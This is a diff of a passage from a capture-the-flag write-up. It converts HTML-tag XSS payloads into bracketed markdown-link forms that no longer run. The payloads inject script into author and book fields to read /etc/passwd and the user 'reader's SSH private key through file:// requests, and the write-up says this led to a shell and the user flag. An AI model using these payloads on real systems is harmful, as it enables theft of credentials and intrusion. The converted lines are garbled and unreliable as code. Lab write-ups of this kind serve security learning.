@@ -174,7 +174,7 @@ After some research, I came to know we can do XSS because the content we are pro
 So We can inject in `author` and `book` name, I started my testing with this.
 
 ```
-<img src=x onerror=document.write('0xw0lf')>
+[img src=x onerror=document.write('0xw0lf')](img src=x onerror=document.write('0xw0lf'))
 ```
 
 User Account:
@@ -188,7 +188,7 @@ Admin Account:
 Its working so try getting `/etc/passwd`
 
 ```
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+[script](script)x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();[/script](/script)
 ```
 
 ## Getting User Shell
@@ -204,7 +204,7 @@ Admin Account:
 Yeah we got it and found user `reader`, So why don’t we try getting `reader` ssh private key.
 
 ```
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
+[script](script)x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();[/script](/script)
 ```
 
 It Worked and I logged in as `reader` (No Password) and got User Flag.
